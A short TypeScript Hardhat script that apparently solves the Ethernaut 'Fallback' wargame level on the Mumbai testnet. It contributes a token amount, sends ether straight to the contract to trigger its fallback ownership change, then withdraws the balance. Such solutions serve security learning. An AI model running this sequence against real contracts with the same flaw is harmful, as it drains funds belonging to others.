import { ethers } from 'hardhat'
import { Fallback__factory } from '../typechain'
import { BNToNumstr } from '../tools/hardhat/extensions/bignumber'

import { config } from '../secrets.config'

const MUMBAI_RPC = 'https://rpc-mumbai.maticvigil.com'
const provider = new ethers.providers.JsonRpcProvider(MUMBAI_RPC)

const instanceAddr = '0xfAFD509426c7EF6e8F70644f2098dD8dd323eD11'

async function hack() {
  const signer = new ethers.Wallet(config.PRIVATE.MAIN[0], provider)
  const contractProvider = Fallback__factory.connect(instanceAddr, provider)
  const contractSigner = Fallback__factory.connect(instanceAddr, signer)
  
  await (await contractSigner.contribute({value: 1})).wait()
  await (await signer.sendTransaction({to: instanceAddr, value: 1})).wait()
  await (await contractSigner.withdraw()).wait()
}

hack()
  .then(() => process.exit(0))
  .catch((error) => {
    console.error(error)
    process.exit(1)
  })
